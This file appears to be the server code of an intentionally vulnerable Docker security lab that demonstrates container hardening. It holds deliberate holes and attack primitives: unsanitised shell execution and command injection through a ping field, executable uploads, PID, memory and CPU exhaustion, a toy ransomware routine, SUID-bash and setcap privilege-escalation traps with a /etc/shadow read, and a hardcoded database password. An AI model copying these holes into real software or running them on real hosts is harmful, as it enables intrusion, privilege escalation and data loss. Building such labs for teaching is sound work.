import { exec as execCallback, execFile as execFileCallback, execFileSync, spawn } from 'node:child_process';
import {
	existsSync,
	mkdirSync,
	readFileSync,
	readlinkSync,
	readdirSync,
	renameSync,
	statSync,
	unlinkSync,
	writeFileSync
} from 'node:fs';
import { cpus } from 'node:os';
import { dirname, join } from 'node:path';
import { promisify } from 'node:util';
import type { CgroupEvidence, LabResponse, ProcessEvidence, RuntimeEvidence } from '$lib/types/lab';

const exec = promisify(execCallback);
const execFile = promisify(execFileCallback);
const dataDir = process.env.LAB_DATA_DIR || '/app/data';
const uploadDir = process.env.LAB_UPLOAD_DIR || '/app/uploads';
const logDir = process.env.LAB_LOG_DIR || '/app/logs';
const ransomwareKeyPath = process.env.LAB_RANSOMWARE_KEY_PATH || '/tmp/dokuru-lab-ransomware-key.txt';
const postgresHost = process.env.CUSTOMER_DB_HOST || 'customer-db';
const postgresUser = process.env.CUSTOMER_DB_USER || 'prod_user';
const postgresPassword = process.env.CUSTOMER_DB_PASSWORD || 'SuperSecretP@ssw0rd123';
const postgresDb = process.env.CUSTOMER_DB_NAME || 'customer_data';
const customerCount = clamp(Number(process.env.LAB_CUSTOMER_COUNT || 1_200_000), 1, 2_000_000);
let memoryHold: Buffer[] = [];

type ExecError = Error & {
	stdout?: string;
	stderr?: string;
};

type PostgresResult = {
	ok: boolean;
	output?: string;
	error?: string;
	skipped?: boolean;
};

export function readFirst(paths: string[]): string {
	for (const path of paths) {
		try {
			return readFileSync(path, 'utf8').trim();
		} catch {
			// Docker may expose cgroup v1 or v2 paths depending on the host.
		}
	}

	return 'unavailable';
}

export function getHostResourceInfo() {
	const cpuCores = cpus().length;
	
	// Get CPU usage percentage
	let cpuUsage = 0;
	try {
		const topOutput = execFileSync('sh', ['-c', "top -bn1 | grep 'Cpu(s)' | awk '{print $2}' | cut -d'%' -f1"], { timeout: 2000 })
			.toString()
			.trim();
		cpuUsage = parseFloat(topOutput) || 0;
	} catch {
		cpuUsage = 0;
	}
	
	// Get memory info in MiB. `free -g` floors small VPS values, so a 1971 MiB host
	// was misleadingly displayed as 1 GiB.
	let memoryTotalGb = 0;
	let memoryAvailableGb = 0;
	let memoryTotalMib = 0;
	let memoryAvailableMib = 0;
	let memoryUsedMib = 0;
	try {
		const memOutput = execFileSync('sh', ['-c', "free -m | awk '/^Mem:/ {print $2,$3,$7}'"], { timeout: 2000 })
			.toString()
			.trim()
			.split(' ');
		memoryTotalMib = parseInt(memOutput[0]) || 0;
		memoryUsedMib = parseInt(memOutput[1]) || 0;
		memoryAvailableMib = parseInt(memOutput[2]) || 0;
		memoryTotalGb = Math.round((memoryTotalMib / 1024) * 10) / 10;
		memoryAvailableGb = Math.round((memoryAvailableMib / 1024) * 10) / 10;
	} catch {
		memoryTotalGb = 0;
		memoryAvailableGb = 0;
		memoryTotalMib = 0;
		memoryAvailableMib = 0;
		memoryUsedMib = 0;
	}
	
	return {
		cpu_cores: cpuCores,
		cpu_usage_percent: Math.round(cpuUsage * 10) / 10,
		memory_total_gb: memoryTotalGb,
		memory_available_gb: memoryAvailableGb,
		memory_total_mib: memoryTotalMib,
		memory_available_mib: memoryAvailableMib,
		memory_used_mib: memoryUsedMib,
		memory_source: 'free -m from inside dokuru-lab; host kernel view, not cgroup usage'
	};
}

export function cgroupEvidence(): CgroupEvidence {
	// Count active CPU burners
	let activeBurners = 0;
	try {
		const count = execFileSync('sh', ['-c', "ps aux | grep '[d]okuru_cpu_burn' | wc -l"], { timeout: 2000 })
			.toString()
			.trim();
		activeBurners = parseInt(count) || 0;
	} catch {
		activeBurners = 0;
	}
	
	return {
		pids_current: readFirst(['/sys/fs/cgroup/pids.current', '/sys/fs/cgroup/pids/pids.current']),
		pids_max: readFirst(['/sys/fs/cgroup/pids.max', '/sys/fs/cgroup/pids/pids.max']),
		memory_current: readFirst([
			'/sys/fs/cgroup/memory.current',
			'/sys/fs/cgroup/memory/memory.usage_in_bytes'
		]),
		memory_max: readFirst([
			'/sys/fs/cgroup/memory.max',
			'/sys/fs/cgroup/memory/memory.limit_in_bytes'
		]),
		cpu_weight: readFirst(['/sys/fs/cgroup/cpu.weight']),
		cpu_max: readFirst(['/sys/fs/cgroup/cpu.max']),
		cpu_shares_v1: readFirst(['/sys/fs/cgroup/cpu/cpu.shares']),
		active_cpu_burners: activeBurners
	};
}

export function processEvidence(): ProcessEvidence {
	return {
		process_count: commandSync("ps -eo pid= | wc -l | tr -d ' '"),
		pid_bomb_sleepers: commandSync("pgrep -fc '[d]okuru_pid_slp|[d]okuru_pid_bomb_sleep' 2>/dev/null || true"),
		memory_holders: commandSync("pgrep -fc '[d]okuru_memory_hold' 2>/dev/null || true"),
		cpu_burners: commandSync("pgrep -fc '[d]okuru_cpu_burn' 2>/dev/null || true"),
		top_processes: commandSync('ps -eo pid,ppid,user,comm | head -12')
	};
}

export function runtimeEvidence(): RuntimeEvidence {
	return {
		id: commandSync('id'),
		uid_map: readFirst(['/proc/self/uid_map']),
		gid_map: readFirst(['/proc/self/gid_map']),
		pid_namespace: namespaceLink('/proc/self/ns/pid'),
		user_namespace: namespaceLink('/proc/self/ns/user'),
		uts_namespace: namespaceLink('/proc/self/ns/uts'),
		cgroup: cgroupEvidence(),
		processes: processEvidence()
	};
}

export async function runShell(command: unknown): Promise<LabResponse> {
	const safeCommand = String(command || 'id').trim().slice(0, 1000) || 'id';

	try {
		const { stdout, stderr } = await exec(safeCommand, {
			timeout: 5000,
			maxBuffer: 1024 * 1024,
			shell: '/bin/sh'
		});

		return {
			ok: true,
			command: safeCommand,
			output: `${stdout}${stderr}`.slice(0, 14000),
			runtime: runtimeEvidence()
		};
	} catch (error) {
		const typedError = error as ExecError;
		return {
			ok: false,
			command: safeCommand,
			output: `${typedError.stdout || ''}${typedError.stderr || ''}`.slice(0, 14000),
			error: typedError.message,
			runtime: runtimeEvidence()
		};
	}
}

export function spawnPidBomb(count: unknown): LabResponse {
	const requested = clamp(Number(count || 120), 1, 500);
	let spawned = 0;
	const errors: string[] = [];

	for (let index = 0; index < requested; index += 1) {
		try {
			const child = spawn(
				process.execPath,
				['-e', "process.title='dokuru_pid_slp'; setTimeout(() => {}, 60000);"],
				{ detached: true, stdio: 'ignore' }
			);
			child.unref();
			spawned += 1;
		} catch (error) {
			errors.push(
				`spawn failed at ${index + 1}: ${error instanceof Error ? error.message : String(error)}`
			);
			break;
		}
	}

	return {
		ok: true,
		scenario: 'PIDs cgroup pressure',
		requested,
		spawned,
		errors,
		cgroup: cgroupEvidence(),
		cleanup: 'POST /api/cleanup to kill dokuru_pid_slp processes'
	};
}

export function allocateMemory(mb: unknown): LabResponse {
	const requested = clamp(Number(mb || 3072), 1, 3500);

	for (let index = 0; index < requested; index += 1) {
		memoryHold.push(Buffer.alloc(1024 * 1024, 'a'));
	}

	return {
		ok: true,
		scenario: 'memory cgroup pressure',
		allocated_mb: requested,
		held_mb: memoryHold.length,
		cgroup: cgroupEvidence()
	};
}

export function burnCpu(seconds: unknown): LabResponse {
	const requested = clamp(Number(seconds || 5), 1, 30);
	const workerCount = clamp(Math.max(cpus().length * 2, 4), 1, 24);
	const pids: number[] = [];

	for (let index = 0; index < workerCount; index += 1) {
		const child = spawn(
			process.execPath,
			[
				'-e',
				`process.title='dokuru_cpu_burn'; const crypto = require('node:crypto'); const end = Date.now() + ${requested} * 1000; let ops = 0; while (Date.now() < end) { crypto.createHash('sha256').update(String(ops++)).digest('hex'); }`
			],
			{ detached: true, stdio: 'ignore' }
		);
		child.unref();
		if (child.pid) pids.push(child.pid);
	}

	return {
		ok: true,
		scenario: 'CPU cgroup pressure',
		seconds: requested,
		cpu_count: cpus().length,
		worker_count: workerCount,
		burner_pids: pids,
		cgroup: cgroupEvidence()
	};
}

export async function uploadDemoFile(file: File): Promise<LabResponse> {
	mkdirSync(uploadDir, { recursive: true });
	const target = join(uploadDir, file.name || `upload-${Date.now()}`);
	const bytes = Buffer.from(await file.arrayBuffer());

	writeFileSync(target, bytes, { mode: 0o755 });

	return {
		ok: true,
		scenario: 'baseline bind-mount upload',
		saved: target,
		size: bytes.length,
		mode: '0755',
		owner: commandSync(`stat -c '%u:%g %A %n' ${shellQuote(target)} 2>/dev/null || ls -lan ${shellQuote(target)}`),
		runtime: runtimeEvidence()
	};
}

export async function pingHost(host: unknown): Promise<LabResponse> {
	const value = String(host || '127.0.0.1').trim().slice(0, 500) || '127.0.0.1';
	return runShell(`ping -c 1 ${value}`);
}

export function stress(type: unknown, duration: unknown): LabResponse {
	const kind = String(type || 'cpu');
	const seconds = clamp(Number(duration || 15), 1, 30);

	if (kind === 'fork' || kind === 'pid') {
		return spawnPidBomb(Math.max(80, seconds * 12));
	}

	if (kind === 'memory') {
		return allocateMemory(3072);
	}

	return burnCpu(seconds);
}

export function triggerCron(): LabResponse {
	mkdirSync(uploadDir, { recursive: true });
	mkdirSync(logDir, { recursive: true });
	const marker = join(uploadDir, '.trigger-cron');
	writeFileSync(marker, `triggered_at=${new Date().toISOString()}\n`);

	return {
		ok: true,
		scenario: 'mock host cron trigger',
		trigger_file: marker,
		message: 'Host-level lab-cron.timer should process uploaded .sh payloads from the bind mount.',
		uploaded_scripts: listFiles(uploadDir, (name) => name.endsWith('.sh')),
		runtime: runtimeEvidence()
	};
}

export async function seedDemoState(): Promise<LabResponse> {
	const files = seedDemoFiles(true);
	const postgres = await seedPostgres();

	return {
		ok: postgres.ok || Boolean(postgres.skipped),
		scenario: 'demo seed',
		message: 'Mock customer files, invoices, and Postgres rows are ready for a repeatable demo.',
		files,
		postgres,
		ownership: {
			uploads: commandSync(`stat -c '%u:%g %A %n' ${shellQuote(uploadDir)} 2>/dev/null || true`),
			customer_sample: commandSync(
				`ls -lan ${shellQuote(join(uploadDir, 'customer-data'))} 2>/dev/null | head -5`
			)
		},
		runtime: runtimeEvidence()
	};
}

export async function resetDemoState(): Promise<LabResponse> {
	const reset = resetExploitState();
	const payloadCleanup = await cleanup();
	const seed = await seedDemoState();

	return {
		ok: Boolean(reset.ok && payloadCleanup.ok && seed.ok),
		scenario: 'full demo reset',
		reset,
		payload_cleanup: payloadCleanup,
		seed
	};
}

export async function dumpAppData(): Promise<LabResponse> {
	seedDemoFiles(false);
	const customerDir = join(uploadDir, 'customer-data');
	const invoiceDir = join(uploadDir, 'invoices');
	const customers = listFiles(customerDir, (name) => /^customer-\d+\.json$/.test(name)).slice(0, 3);
	const invoices = listFiles(invoiceDir, (name) => /^invoice-\d+\.txt$/.test(name)).slice(0, 3);
	const postgres = await queryPostgres(`
SELECT 'customer_count=' || count(*) FROM customers;
SELECT id || '|' || name || '|' || email || '|' || balance FROM customers ORDER BY id LIMIT 5;
`);

	return {
		ok: true,
		scenario: 'app data dump',
		message: 'Command injection as container root can read app data, configs, and reachable service data without host shell.',
		readable_paths: {
			uploads: uploadDir,
			customer_data: customerDir,
			invoices: invoiceDir,
			config: '/app/config',
			logs: logDir
		},
		customer_files: customers.map((path) => ({
			path,
			owner: commandSync(`stat -c '%u:%g %A' ${shellQuote(path)} 2>/dev/null || true`),
			preview: readFileSync(path, 'utf8').slice(0, 500)
		})),
		invoice_files: invoices.map((path) => ({
			path,
			owner: commandSync(`stat -c '%u:%g %A' ${shellQuote(path)} 2>/dev/null || true`),
			preview: readFileSync(path, 'utf8').slice(0, 300)
		})),
		postgres,
		runtime: runtimeEvidence()
	};
}

export function ransomwareStrike(): LabResponse {
	const targetDir = join(uploadDir, 'customer-data');
	seedDemoFiles(false);
	const key = `dokuru-demo-key-${Date.now()}`;
	const encrypted: string[] = [];

	for (const path of listFiles(targetDir, (name) => /^customer-\d+\.json$/.test(name))) {
		if (path.endsWith('.locked') || path.endsWith('RANSOM_NOTE.txt')) continue;
		const content = readFileSync(path);
		const payload = Buffer.from(content.toString('base64').split('').reverse().join(''));
		writeFileSync(`${path}.locked`, payload);
		renameSync(path, `${path}.bak`);
		encrypted.push(`${path}.locked`);
	}

	writeFileSync(ransomwareKeyPath, `${key}\n`);
	writeFileSync(
		join(targetDir, 'RANSOM_NOTE.txt'),
		[
			'DOKURU BASELINE DEMO',
			'Customer files were encrypted by a controlled lab payload.',
			`Encrypted files: ${encrypted.length}`,
			`Recovery key path: ${ransomwareKeyPath}`,
			''
		].join('\n')
	);

	return {
		ok: true,
		scenario: 'controlled ransomware strike',
		target_dir: targetDir,
		encrypted_count: encrypted.length,
		key_path: ransomwareKeyPath,
		sample: encrypted.slice(0, 10)
	};
}

export function resetExploitState(): LabResponse {
	const targetDir = join(uploadDir, 'customer-data');
	let restored = 0;

	for (const path of walkFiles(targetDir)) {
		if (path.endsWith('.bak')) {
			const original = path.slice(0, -4);
			renameSync(path, original);
			restored += 1;
		}
	}

	for (const path of walkFiles(targetDir)) {
		if (path.endsWith('.locked') || path.endsWith('RANSOM_NOTE.txt')) {
			try {
				unlinkSync(path);
			} catch {
				// Best-effort cleanup keeps reset robust during demos.
			}
		}
	}

	return {
		ok: true,
		scenario: 'demo reset',
		restored_files: restored,
		remaining_customer_files: listFiles(targetDir, (name) => /^customer-\d+\.json$/.test(name)).length,
		runtime: runtimeEvidence()
	};
}

export async function cleanup(): Promise<LabResponse> {
	memoryHold = [];
	return runShell("pkill -f '[d]okuru_pid_slp|[d]okuru_pid_bomb_sleep|[d]okuru_cpu_burn' 2>&1 || true");
}

const suidTrapName = 'system-health-check';
const setcapTrapName = 'net-diagnose';
const suidTrapPath = join(uploadDir, suidTrapName);
const setcapTrapPath = join(uploadDir, setcapTrapName);

export function plantSuidTrap(): LabResponse {
	mkdirSync(uploadDir, { recursive: true });

	try {
		// Copy /bin/bash (or fallback to /bin/sh) and set SUID bit
		const sourceBinary = existsSync('/bin/bash') ? '/bin/bash' : '/bin/sh';
		execFileSync('cp', [sourceBinary, suidTrapPath]);
		execFileSync('chmod', ['4755', suidTrapPath]);
	} catch (error) {
		return {
			ok: false,
			scenario: 'SUID LPE trap',
			error: error instanceof Error ? error.message : String(error)
		};
	}

	const stat = commandSync(`stat -c '%A %a %u:%g %U:%G %n' ${shellQuote(suidTrapPath)}`);
	const uidMap = readFirst(['/proc/self/uid_map']);
	const isUsernsActive = uidMap.trim().split(/\s+/).slice(0, 3).join(' ') !== '0 0 4294967295';

	return {
		ok: true,
		scenario: 'SUID LPE trap planted',
		trap_path: suidTrapPath,
		host_path: `~/apps/dokuru-lab/uploads/${suidTrapName}`,
		verification_cmd: `./${suidTrapName} -p -c 'id; whoami; cat /etc/shadow | head -3'`,
		stat,
		uid_map: uidMap,
		userns_remap_active: isUsernsActive,
		expected_impact: isUsernsActive
			? 'SUID bit owned by remapped UID — running this as unprivileged host user gives no privilege elevation'
			: 'DANGEROUS — SUID bit owned by host root — running this as unprivileged host user yields full root shell',
		recommended_next: isUsernsActive
			? 'Demo the neutralized attack: execute ./system-health-check -p from host — euid stays unprivileged'
			: 'Demo the lethal attack: execute ./system-health-check -p from host — euid becomes 0(root)',
		runtime: runtimeEvidence()
	};
}

export function plantSetcapTrap(): LabResponse {
	mkdirSync(uploadDir, { recursive: true });

	const sourceBinary = existsSync('/bin/ping') ? '/bin/ping' : '/usr/bin/ping';
	if (!existsSync(sourceBinary)) {
		return {
			ok: false,
			scenario: 'setcap capability trap',
			error: 'source binary (/bin/ping or /usr/bin/ping) not found'
		};
	}

	let setcapError: string | null = null;
	try {
		execFileSync('cp', [sourceBinary, setcapTrapPath]);
		// Attempt to grant network admin + raw + bind capabilities
		execFileSync('setcap', ['cap_net_admin,cap_net_raw,cap_net_bind_service+ep', setcapTrapPath]);
	} catch (error) {
		setcapError = error instanceof Error ? error.message : String(error);
	}

	const stat = commandSync(`stat -c '%A %a %u:%g %U:%G %n' ${shellQuote(setcapTrapPath)}`);
	const capabilities = commandSync(`getcap ${shellQuote(setcapTrapPath)} 2>&1 || echo no-caps-present`);
	const uidMap = readFirst(['/proc/self/uid_map']);
	const isUsernsActive = uidMap.trim().split(/\s+/).slice(0, 3).join(' ') !== '0 0 4294967295';

	return {
		ok: setcapError === null,
		scenario: 'setcap capability trap',
		trap_path: setcapTrapPath,
		host_path: `~/apps/dokuru-lab/uploads/${setcapTrapName}`,
		stat,
		capabilities,
		uid_map: uidMap,
		userns_remap_active: isUsernsActive,
		setcap_error: setcapError,
		expected_impact: setcapError
			? 'setcap FAILED — kernel rejected capability assignment (likely userns-remap active, container lacks CAP_SETFCAP in init_user_ns)'
			: 'DANGEROUS — binary now carries network admin + raw socket capabilities as host root. Any host user executing it inherits those powers.',
		recommended_next: setcapError
			? 'Demo the neutralized attack: show that attacker cannot elevate file capabilities anymore'
			: 'Demo the lethal primitive: any unprivileged host user running ./net-diagnose gains network admin powers',
		runtime: runtimeEvidence()
	};
}

export function cleanupExploitTraps(): LabResponse {
	const removed: string[] = [];
	const errors: string[] = [];

	for (const path of [suidTrapPath, setcapTrapPath]) {
		if (!existsSync(path)) continue;
		try {
			unlinkSync(path);
			removed.push(path);
		} catch (error) {
			errors.push(`${path}: ${error instanceof Error ? error.message : String(error)}`);
		}
	}

	return {
		ok: errors.length === 0,
		scenario: 'exploit trap cleanup',
		removed,
		errors,
		runtime: runtimeEvidence()
	};
}

export function health(): LabResponse {
	ensureDataDir();
	const probePath = join(dataDir, 'health-probe.txt');

	const checks = {
		data_dir_exists: existsSync(dataDir),
		data_dir_writable: canWrite(probePath),
		runtime_ready: true
	};

	return {
		ok: !Object.values(checks).includes(false),
		checks,
		runtime: runtimeEvidence()
	};
}

export function probe(): LabResponse {
	ensureDataDir();
	const path = join(dataDir, 'recovery-probe.txt');
	const payload = `probe=${new Date().toISOString()}\n`;
	writeFileSync(path, payload);

	return {
		ok: true,
		file_path: path,
		file_contents: payload.trim(),
		runtime: runtimeEvidence()
	};
}

export async function parseJsonBody<T extends Record<string, unknown>>(
	request: Request
): Promise<Partial<T>> {
	try {
		const value = await request.json();
		return typeof value === 'object' && value !== null ? (value as Partial<T>) : {};
	} catch {
		return {};
	}
}

function commandSync(command: string): string {
	try {
		return execFileSync('/bin/sh', ['-lc', command], { encoding: 'utf8', timeout: 3000 }).trim();
	} catch (error) {
		return error instanceof Error ? error.message : String(error);
	}
}

function namespaceLink(path: string): string {
	try {
		return readlinkSync(path);
	} catch {
		return 'unavailable';
	}
}

function ensureDataDir(): void {
	mkdirSync(dataDir, { recursive: true });
}

function canWrite(path: string): boolean {
	try {
		mkdirSync(dirname(path), { recursive: true });
		writeFileSync(path, `write=${new Date().toISOString()}\n`);
		return true;
	} catch {
		return false;
	}
}

function clamp(value: number, min: number, max: number): number {
	if (!Number.isFinite(value)) return min;
	return Math.min(Math.max(Math.trunc(value), min), max);
}

function seedDemoFiles(force: boolean): Record<string, unknown> {
	const customerDir = join(uploadDir, 'customer-data');
	const invoiceDir = join(uploadDir, 'invoices');

	mkdirSync(customerDir, { recursive: true });
	mkdirSync(invoiceDir, { recursive: true });

	if (force) {
		for (const path of walkFiles(customerDir)) {
			if (/customer-\d+\.json(\.bak|\.locked)?$/.test(path) || path.endsWith('RANSOM_NOTE.txt')) {
				unlinkSync(path);
			}
		}
		for (const path of walkFiles(invoiceDir)) {
			if (/invoice-\d+\.txt$/.test(path)) unlinkSync(path);
		}
	}

	for (let index = 1; index <= 200; index += 1) {
		const id = String(index).padStart(4, '0');
		const path = join(customerDir, `customer-${id}.json`);
		if (!force && existsSync(path)) continue;
		writeFileSync(
			path,
			JSON.stringify(
				{
					id,
					name: `Demo Customer ${id}`,
					email: `customer${id}@example.test`,
					balance: index * 17,
					created_at: new Date().toISOString()
				},
				null,
				2
			)
		);
	}

	for (let index = 1; index <= 30; index += 1) {
		const id = String(index).padStart(3, '0');
		const path = join(invoiceDir, `invoice-${id}.txt`);
		if (!force && existsSync(path)) continue;
		writeFileSync(path, `Invoice ${id}\nAmount: ${index * 91_000}\nStatus: unpaid\n`);
	}

	return {
		customer_dir: customerDir,
		invoice_dir: invoiceDir,
		customer_files: listFiles(customerDir, (name) => /^customer-\d+\.json$/.test(name)).length,
		locked_files: listFiles(customerDir, (name) => name.endsWith('.locked')).length,
		invoice_files: listFiles(invoiceDir, (name) => /^invoice-\d+\.txt$/.test(name)).length
	};
}

async function seedPostgres(): Promise<PostgresResult> {
	const sqlPath = '/tmp/dokuru-lab-seed.sql';
	writeFileSync(
		sqlPath,
		[
			'CREATE TABLE IF NOT EXISTS customers (',
			'  id BIGSERIAL PRIMARY KEY,',
			'  name TEXT NOT NULL,',
			'  email TEXT NOT NULL,',
			'  balance BIGINT NOT NULL',
			');',
			'TRUNCATE customers;',
			'INSERT INTO customers (name, email, balance)',
			'SELECT',
			"  'Customer ' || gs,",
			"  'customer' || gs || '@example.test',",
			'  gs * 17',
			`FROM generate_series(1, ${customerCount}) AS gs;`,
			"SELECT 'customer_count=' || count(*) FROM customers;"
		].join('\n')
	);

	return queryPostgresFile(sqlPath, 90_000);
}

async function queryPostgres(sql: string): Promise<PostgresResult> {
	const sqlPath = `/tmp/dokuru-lab-query-${Date.now()}.sql`;
	writeFileSync(sqlPath, sql.trim() + '\n');
	try {
		return await queryPostgresFile(sqlPath, 20_000);
	} finally {
		try {
			unlinkSync(sqlPath);
		} catch {
			// Best-effort temp cleanup.
		}
	}
}

async function queryPostgresFile(sqlPath: string, timeout: number): Promise<PostgresResult> {
	const psqlPath = commandSync('command -v psql || true');
	if (!psqlPath) {
		return {
			ok: false,
			skipped: true,
			error: 'psql not installed in this image; Postgres seed skipped'
		};
	}

	try {
		const { stdout, stderr } = await execFile(
			psqlPath,
			[
				'-h',
				postgresHost,
				'-U',
				postgresUser,
				'-d',
				postgresDb,
				'-v',
				'ON_ERROR_STOP=1',
				'-q',
				'-tA',
				'-f',
				sqlPath
			],
			{
				env: { ...process.env, PGPASSWORD: postgresPassword },
				timeout,
				maxBuffer: 1024 * 1024
			}
		);

		return {
			ok: true,
			output: `${stdout}${stderr}`.trim()
		};
	} catch (error) {
		const typedError = error as ExecError;
		return {
			ok: false,
			output: `${typedError.stdout || ''}${typedError.stderr || ''}`.trim(),
			error: typedError.message
		};
	}
}

function walkFiles(root: string): string[] {
	if (!existsSync(root)) return [];
	const output: string[] = [];
	for (const entry of readdirSync(root)) {
		const path = join(root, entry);
		const stat = statSync(path);
		if (stat.isDirectory()) output.push(...walkFiles(path));
		else output.push(path);
	}
	return output;
}

function listFiles(root: string, filter: (name: string) => boolean = () => true): string[] {
	if (!existsSync(root)) return [];
	return readdirSync(root)
		.filter(filter)
		.map((name) => join(root, name));
}

function shellQuote(value: string): string {
	return `'${value.replaceAll("'", "'\\''")}'`;
}
